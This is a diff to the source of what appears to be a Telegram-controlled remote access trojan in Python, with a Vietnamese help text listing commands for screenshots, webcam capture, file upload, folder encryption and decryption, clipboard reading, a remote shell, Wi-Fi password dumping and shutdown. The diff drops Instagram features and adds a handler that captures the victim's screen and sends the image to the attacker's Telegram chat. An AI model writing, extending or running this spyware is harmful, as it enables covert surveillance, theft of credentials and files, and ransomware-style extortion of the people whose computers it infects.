@@ -4,7 +4,6 @@ import mss
 import cv2
 import time
 import pyttsx3
-import instaloader
 import telebot
 import platform
 import clipboard
@@ -28,9 +27,21 @@ def start(message):
 
 @bot.message_handler(commands=['help'])
 def help_msg(message):
-    help_text = 'Nhập /screen để chụp ảnh màn hình.\n/sys để xem thông tin cấu hình thiết bị.\n/ip để xem địa chỉ ip.\n/cd để điều hương thư mục. \n/ls để xem danh sách. \n/upload [path] để nhận file.\n/crypt [path] cho các tập tin thư mục mật mã. \n /decrypt [path] \n/webcam chụp ảnh \n/lock \n /clipboard dán từ bộ nhớ tạm \n/shell \n/wifi để xem mật khẩu wifi \n/speech [hi] để nói từ thiết bị được ra lệnh, \n/shutdown đế tắt máy tính, \n/instagram [url] để tải ảnh hoặc video từ Instagram, \n/set_instagram_user [username] để thiết lập tên người dùng Instagram, \n/delete_instagram_user để xóa tên người dùng Instagram'
+    help_text = 'Nhập /screen để chụp ảnh màn hình.\n/sys để xem thông tin cấu hình thiết bị.\n/ip để xem địa chỉ ip.\n/cd để điều hương thư mục. \n/ls để xem danh sách. \n/upload [path] để nhận file.\n/crypt [path] cho các tập tin thư mục mật mã. \n /decrypt [path] \n/webcam chụp ảnh \n/lock \n /clipboard dán từ bộ nhớ tạm \n/shell \n/wifi để xem mật khẩu wifi \n/speech [hi] để nói từ thiết bị được ra lệnh, \n/shutdown đế tắt máy tính'
     bot.send_message(message.chat.id, help_text)
 
+@bot.message_handler(commands=['screen'])
+def send_screen(message):
+    with mss.mss() as sct:
+        sct.shot(output=f"{cd}\capture.png")
+                              
+    image_path = f"{cd}\capture.png"
+    print(image_path)
+    with open(image_path, "rb") as photo:
+        bot.send_photo(message.chat.id, photo)
+   
+        
+        
 @bot.message_handler(commands=['ip'])
 def send_ip_info(message):
     try:
